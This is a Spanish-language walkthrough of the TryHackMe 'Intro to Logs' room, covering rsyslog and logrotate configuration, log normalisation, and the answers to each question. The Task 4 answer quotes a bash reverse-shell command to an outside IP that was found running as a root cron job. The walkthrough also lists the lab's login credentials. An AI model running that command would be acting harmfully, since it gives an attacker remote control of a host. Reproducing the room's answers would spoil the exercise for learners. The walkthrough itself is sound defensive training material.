# TryHackMe — Intro to Logs
**Dificultad** -> Fácil | **Fecha** -> 31-jul-26 | **Tipo** -> Free + Hands-on \
**Sala** -> [Intro to Logs](https://tryhackme.com/room/introtologs)
## Introducción
La sala se enfoca en lo que es un log, las fuentes y los métodos de recolección de los mismos. También se aborda el logging desde cero en Linux con **rsyslog** y **logrotate** para analizar y detectar posible actividad maliciosa.
## Solución

> [!NOTE]
> El acceso a la máquina se puede llevar a cabo por medio de la VPN de TryHackMe, con el laboratorio dentro de la sala o con `xfreerdp` en Linux.

### Task 2 — Logs as evidence of historical activity
Escenario descrito: un servidor está bajo constantes escaneos de adversarios. Un compañero desconocido nos dejó una nota en el escritorio para empezar la investigación desde cierto archivo.

``` bash
# Ingresando a la VM por medio de RDP
$ xfreerdp /u:damianhall /p:Logs321! /v:<MACHINE_IP> /dynamic_resolution
```

___
*Pregunta 1: What is the name of your colleague who left a note on your Desktop?* \
**Respuesta: Perry**

*Pregunta 2: What is the full path to the suggested log file for initial investigation?* \
**Respuesta: `/var/log/gitlab/nginx/access.log`**
### Task 3 — Types, formats and standards
#### Log Types
Hay muchos tipos de logs dentro del sistema que podemos revisar, los más comúnes son: **Application**, **Audit**, **Security**, **Server**, **System**, **Network**, **Database**, **Web server**.
#### Logs formats
Los formatos de los logs varían pero usualmente van a caer en 3 categorías:
- **Estructurados:** JSON, CSV, XML, ELF
- **Semiestructurados:** syslog, EVTX
- **Desestructurados:** CLF, Combined

___

*Pregunta 1: Based on the list of log types in this task, what log type is used by the log file specified in the note from Task 2?* \
**Respuesta: Web server log**

> NGINX es un servidor web, por lo tanto son peticiones HTTP lo que se está buscando.

*Pregunta 2: Based on the list of log formats in this task, what log format is used by the log file specified in the note from Task 2?* \
**Respuesta: Combined**

> Los logs tienen IP, timestamp, método HTTP, URL, status, referrer y User-Agent, por lo tanto es NCSA Combined.

### Task 4 — Collection, Management and Centralisation

```shell
# 1. Verificar que rsyslog esté activo
sudo systemctl status rsyslog

# 2. Crear el archivo de configuración para SSH (utilizar cualquier editor)
sudo nano /etc/rsyslog.d/98-websrv-02_sshd.conf
```
```
$FileCreateMode 0644
:programname, isequal, "sshd" /var/log/websrv-02/rsyslog_sshd.log
```
```bash
# 3. Reiniciar el servicio rsyslog y verificar
sudo systemctl restart rsyslog
ls /var/log/websrv-02/
```

![rsyslog](<./Images/rsyslog.png>)

```bash
# Revisar la actividad de SSH en el archivo 
cat /var/log/websrv-02/rsyslog_sshd.log
```

![tail_command](<./Images/tail.png>)

``` bash
# Revisar la configuración del cron
cat /etc/rsyslog.d/99-websrv-02-cron.conf
```

```bash
# Dentro del archivo de configuración de cron

# Log Forwarding with rsyslog
$FileCreateMode 0644
:programname, isequal, "CRON" /var/log/websrv-02/rsyslog_cron.log
# Forward Logs to SIEM-02:51514
# *.* @10.10.10.101:51514
```

``` bash
# Buscar los comandos ejecutados por root
cat /var/log/websrv-02/rsyslog_cron.log | grep -w "CMD"
```

![cat_command](<./Images/cat.png>)

___

*Pregunta 1: After configuring rsyslog for sshd, what username repeatedly appears in the sshd logs at /var/log/websrv-02/rsyslog_sshd.log, indicating failed login attempts or brute forcing?*
**Respuesta: stansimon**

> Cuando se despliega la información (utilizando `cat`) se puede notar que hay un usuario que ha intentado ingresar pero falla al autenticarse; aparece como:
> 
> `Connection closed by invalid user stansimon` o `Failed password for invalid user stansimon`.

*Pregunta 2: What is the IP address of SIEM-02 based on the rsyslog configuration file `/etc/rsyslog.d/99-websrv-02-cron.conf`, which is used to monitor cron messages?*
**Respuesta: `10.10.10.101`**

> **NOTA**: Se puede utilizar el comando `cat` para visualizar el archivo sin abrirlo.

``` shell
$ cat /etc/rsyslog.d/99-websrv-02-cron.conf
```

*Pregunta 3: Based on the generated logs in `/var/log/websrv-02/rsyslog_cron.log`, what command is being executed by the root user?*
**Respuesta: `/bin/bash -c "/bin/bash -i >& /dev/tcp/34.253.159.159/9999 0>&1"`**

> **ADVERTENCIA**: Al desplegar el comando, puede engañar ya que es muy largo. La parte relevante es el comando que se repite, no el más largo en primera instancia.
> 
> **INFO**: que un comando se repita es un indicativo de que algo raro está pasando, no se debe ignorar.

### Task 5 — Storage, Retention and Deletion
#### Configurando...

```bash
# Crear el archivo de configuración de SSH
touch /etc/logrotate.d/98-websrv-02_sshd.conf
```

```yaml
# Dónde se va a guardar el archivo, con qué frecuencia y la cantidad de rotaciones
/var/log/websrv-02/rsyslog_sshd.log {
    daily
    rotate 30
    compress
    lastaction
        DATE=$(date +"%Y-%m-%d")
        echo "$(date)" >> "/var/log/websrv-02/hashes_"$DATE"_rsyslog_sshd.txt"
        for i in $(seq 1 30); do
            FILE="/var/log/websrv-02/rsyslog_sshd.log.$i.gz"
            if [ -f "$FILE" ]; then
                HASH=$(/usr/bin/sha256sum "$FILE" | awk '{ print $1 }')
                echo "rsyslog_sshd.log.$i.gz "$HASH"" >> "/var/log/websrv-02/hashes_"$DATE"_rsyslog_sshd.txt"
            fi
        done
        systemctl restart rsyslog
    endscript
}
```

```bash
#Ejecutando el archivo manualmente
sudo logrotate -f /etc/logrotate.d/98-websrv-02_sshd.conf
```

Cuando termina la ejecución, se crea el archivo de hashes para el **rsyslog** de SSH (se resaltó en amarillo)

![hashes](<./Images/rsyslog_hashes.png>)

___

*Pregunta 1: Based on the logrotate configuration `/etc/logrotate.d/99-websrv-02_cron.conf`, how many versions of old compressed log file copies will be kept?*
**Respuesta: 24**

![websrv](<./Images/websrv.png>)

*Pregunta 2: Based on the logrotate configuration `/etc/logrotate.d/99-websrv-02_cron.conf`, what is the log rotation frequency?*
**Respuesta: hourly**

### Task 6 — Log analysis process, tools and techniques
**Flujo del análisis:**

```http
<!-- Observando los logs en crudo en el Log Viewer (dentro de la VM) -->
http://MACHINE_IP:8111/log?log=%2Fvar%2Flog%2Fgitlab%2Fnginx%2Faccess.log&log=%2Fvar%2Flog%2Fwebsrv-02%2Frsyslog_cron.log&log=%2Fvar%2Flog%2Fwebsrv-02%2Frsyslog_sshd.log&log=%2Fvar%2Flog%2Fgitlab%2Fgitlab-rails%2Fapi_json.log
```

![log_viewer](<./Images/log_viewer.png>)

```bash
# Usar awk y sed para normalizar las entradas de los logs
awk -F'[][]' '{print "[" $2 "]", "--- /var/log/gitlab/nginx/access.log ---", "\"" $0 "\""}' /var/log/gitlab/nginx/access.log | sed "s/ +0000//g" > /tmp/parsed_consolidated.log
```
   
```shell
# Flitrando la IP sospechosa
grep "34.253.159.159" /tmp/parsed_consolidated.log > /tmp/filtered_consolidated.log
```

```bash
# Ordenando por el timestamp
sort /tmp/parsed_consolidated.log > /tmp/sort_parsed_consolidated.log
```

```bash
# Eliminando duplicados con uniq
uniq /tmp/sort_parsed_consolidated.log > /tmp/uniq_sort_parsed_consolidated.log
```

```yaml
# Observar el resultado en el Log Viewer
http://MACHINE_IP:8111/log?path=%2Ftmp%2Funiq_sort_parsed_consolidated.log
```

![consolidated_](<./Images/log_viewer_consolidated.png>)
___
*Pregunta 1: Upon accessing the log viewer URL for unparsed raw log files, what error does `/var/log/websrv-02/rsyslog_cron.log` show when selecting the different filters?* \
**Respuesta: No date field**

> **CUIDADO**: Se debe desplegar el menú (1 / 4 logs), no agregar un filtro (`+Add filter`).

*Pregunta 2: What is the process of standardising parsed data into a more easily readable and query-able format?* \
**Respuesta: Normalisation**

> **NOTA**: Se han procesado los archivos y se les ha proporcionado un formato único para una lectura más eficiente.

*Pregunta 3: What is the process of consolidating normalised logs to enhance the analysis of activities related to a specific IP address?* \
**Respuesta: Enrichment**

> El enriquecimiento agrega metadatos relevantes a las entradas de los logs (por ejemplo el timestamp).

---
## Lecciones aprendidas
- Antes de cualquier análisis, es una buena práctica **normalizar** todos los logs. Si no lo haces, intentar correlacionar los logs unos con otros se volverá una tarea complicada.
- `rsyslog` y `logrotate` son fundamentales para el análisis y gestión de logs en Linux.
- Es buena idea estudiar el cómo se organizan los `.conf`.
- El pipeline `awk -> grep -> sort -> uniq` es replicable para cualquier tipo de análisis rápido.
- Los comandos que se repiten en **cron** son sospechosos por definición; no es normal que se creen estos comandos.
- Los logs por si solos no dicen nada. Hasta que no se correlacionan, es cuando tienen importancia y revelan un ataque.